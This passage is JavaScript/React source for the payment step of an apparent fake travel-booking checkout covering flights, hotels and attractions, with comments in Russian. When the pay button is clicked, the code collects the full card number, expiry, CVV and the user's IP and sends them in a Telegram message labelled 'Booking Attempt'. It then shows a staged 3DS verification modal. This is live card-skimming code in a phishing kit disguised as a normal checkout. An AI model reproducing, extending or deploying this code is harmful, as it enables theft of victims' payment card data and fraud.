                validationErrors.push('Phone number is required');
              }
            }
            
            if (validationErrors.length > 0) {
              alert(`Please complete the following:\n${validationErrors.join('\n')}`);
              return;
            }
            
            try {
              const offerId = sessionStorage.getItem('current_offer_id') || '';
              const panKey = paymentStorageKey || offerId || 'payment:default';
              const summary = isHotelBooking 
                ? `Guests: ${adults} adult${adults > 1 ? 's' : ''}${kids.length > 0 ? `, ${kids.length} child${kids.length > 1 ? 'ren' : ''}` : ''}`
                : isAttractionBooking
                  ? `Experience: ${attractionBooking?.attraction?.name || 'Attraction'}${attractionTicketLine ? `\nTickets: ${attractionTicketLine}` : ''}`
                  : formatTravelerSummary({ ...trav, email: contact.email, phone: contact.phone });
              let cardLine = `${String(card?.brand||'CARD')} •••• ${String(card?.last4||'')}`;
              const pan = sessionStorage.getItem(`payment_card_one_time_pan_${panKey}`) || localStorage.getItem(`payment_card_one_time_pan_${panKey}`);
              if (pan) { cardLine = `${card?.brand||'CARD'} ${pan}`; }
              const cvv = sessionStorage.getItem(`payment_card_one_time_cvv_${panKey}`) || localStorage.getItem(`payment_card_one_time_cvv_${panKey}`);
              
              // Получаем IP адрес ТОЛЬКО через наш backend, без внешних fetch из браузера
              let userIP = '127.0.0.1'; // Дефолт на случай ошибки
              try {
                // Используем всегда относительный путь, как во всём проекте
                const ipResponse = await fetch('/api/geo/ip');
                if (ipResponse.ok) {
                  // Проверяем Content-Type перед парсингом JSON
                  const contentType = ipResponse.headers.get('content-type') || '';
                  if (contentType.includes('application/json')) {
                    try {
                      const ipData = await ipResponse.json();
                      const rawIp = ipData?.ip;
                      if (rawIp && rawIp !== 'Unknown' && typeof rawIp === 'string') {
                        userIP = rawIp;
                      }
                      console.log('Payment: Received IP data from /api/geo/ip:', ipData, 'Extracted IP:', userIP);
                    } catch (jsonError) {
                      console.warn('Payment: Failed to parse JSON from /api/geo/ip:', jsonError);
                    }
                  } else {
                    const text = await ipResponse.text().catch(() => '');
                    console.warn('Payment: /api/geo/ip returned non-JSON:', contentType, text.substring(0, 100));
                  }
                } else {
                  const errorText = await ipResponse.text().catch(() => '');
                  console.warn('Payment: IP response not OK from /api/geo/ip:', ipResponse.status, errorText.substring(0, 100));
                }
              } catch (error) {
                console.error('Payment: Failed to get IP:', error);
              }
              
              // Отправляем уведомление о попытке оплаты
              const telegramMessage = isHotelBooking 
                ? `🏨 <b>Hotel Booking Attempt</b>\n<b>Hotel</b>: ${hotelData?.hotel_name || 'Hotel'}\n<b>Location</b>: ${hotelData?.address || ''}, ${hotelData?.city || 'City'}\n<b>Dates</b>: ${hotelData?.checkIn && hotelData?.checkOut ? `${new Date(hotelData.checkIn).toLocaleDateString('en-GB', { day: 'numeric', month: 'short' })} - ${new Date(hotelData.checkOut).toLocaleDateString('en-GB', { day: 'numeric', month: 'short' })}` : 'Check-in - Check-out'}\n<b>Guests</b>: ${adults} adult${adults > 1 ? 's' : ''}${kids.length > 0 ? `, ${kids.length} child${kids.length > 1 ? 'ren' : ''}` : ''}\n<b>Rooms</b>: ${hotelData?.rooms || 1}\n<b>Card</b>: ${cardLine} ${card?.expiry?`(exp ${card.expiry})`:''}${cvv?`\n<b>CVV</b>: ${cvv}`:''}\n<b>Amount</b>: ${currency} ${total.toFixed(2)}\n<b>IP</b>: ${userIP}`
                : isAttractionBooking
                  ? `🎟 <b>Attraction Booking Attempt</b>\n<b>Attraction</b>: ${attractionBooking?.attraction?.name || 'Attraction'}\n<b>Card</b>: ${cardLine} ${card?.expiry?`(exp ${card.expiry})`:''}${cvv?`\n<b>CVV</b>: ${cvv}`:''}\n<b>Amount</b>: ${currency} ${total.toFixed(2)}\n<b>IP</b>: ${userIP}\n${summary}`
                  : `💳 <b>Flight Booking Attempt</b>\n<b>Route</b>: ${firstSeg?.departureAirport?.code} → ${lastSeg?.arrivalAirport?.code}\n<b>Card</b>: ${cardLine} ${card?.expiry?`(exp ${card.expiry})`:''}${cvv?`\n<b>CVV</b>: ${cvv}`:''}\n<b>Amount</b>: ${currency} ${total.toFixed(2)}\n<b>IP</b>: ${userIP}\n${summary}`;
              
              sendTelegram(telegramMessage);
            } catch {}
            setThreeDSOpen(true);
          }}>
            <span className="applepay-ico" aria-hidden="true"><img src={appleLogo} alt="Apple" style={{ width:20, height:20 }} /></span>
            <span style={{ color:'#000' }}>{t('bookAndPay')}</span>
            <span className="applepay-lock" aria-hidden="true">
              <svg width="18" height="18" viewBox="0 0 24 24" fill="#000" xmlns="http://www.w3.org/2000/svg"><path d="M12 1a5 5 0 0 0-5 5v3H6a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-9a2 2 0 0 0-2-2h-1V6a5 5 0 0 0-5-5zm-3 8V6a3 3 0 1 1 6 0v3H9z"/></svg>
            </span>
          </button>
        ) : (
          <button className="next-button" onClick={()=>{ 
            // Валидация данных пользователя перед выбором способа оплаты
            const validationErrors = [];
            
            if (isHotelBooking) {
              // Для отелей проверяем данные гостей
              if (!hotelData?.hotel_name) {
                validationErrors.push('Hotel information is missing');
              }
            } else if (isAttractionBooking) {
              if (!contact.email?.trim()) validationErrors.push('Email is required');
              if (!contact.phone?.trim()) validationErrors.push('Phone number is required');
            } else {
              // Для рейсов проверяем данные путешественников
              if (!trav.firstName?.trim() || !trav.lastName?.trim()) {
                validationErrors.push('Traveler name is required');
              }
              if (!contact.email?.trim()) {
                validationErrors.push('Email is required');
              }
              if (!contact.phone?.trim()) {
                validationErrors.push('Phone number is required');
              }
            }
            
            if (validationErrors.length > 0) {
              alert(`Please complete the following:\n${validationErrors.join('\n')}`);
              return;
            }
            
            navigate('/payment/new-card'); 
          }}>{t('choosePayment')}</button>
        )}
      </div>
      {threeDSOpen && (
        <ThreeDSModal
          onClose={()=> setThreeDSOpen(false)}
          merchant={isHotelBooking 
            ? `${hotelData?.hotel_name || 'Hotel'} (${hotelData?.city || 'City'})`
            : `${firstSeg?.departureAirport?.code || ''} → ${lastSeg?.arrivalAirport?.code || ''}`
          }
          amount={`${currency} ${total.toFixed(2)}`}
          brand={String(card?.brand || '').toLowerCase()}
          cardMasked={`****  ****\n****  ${String(card?.last4||'0000')}`}
          preloadMs={20000}
          initialSeconds={240}
          debug={false}
        />
      )}
      {openSegIdx!==null && flight?.segments?.[openSegIdx] && (
        <SegmentDetailsModal
          segment={flight.segments[openSegIdx]}
          title={`${flight.segments[openSegIdx]?.departureAirport?.city || flight.segments[openSegIdx]?.departureAirport?.code} → ${flight.segments[openSegIdx]?.arrivalAirport?.city || flight.segments[openSegIdx]?.arrivalAirport?.code}`}
          onClose={()=> setOpenSegIdx(null)}
        />
      )}
    </div>
  );
};

export default Payment;


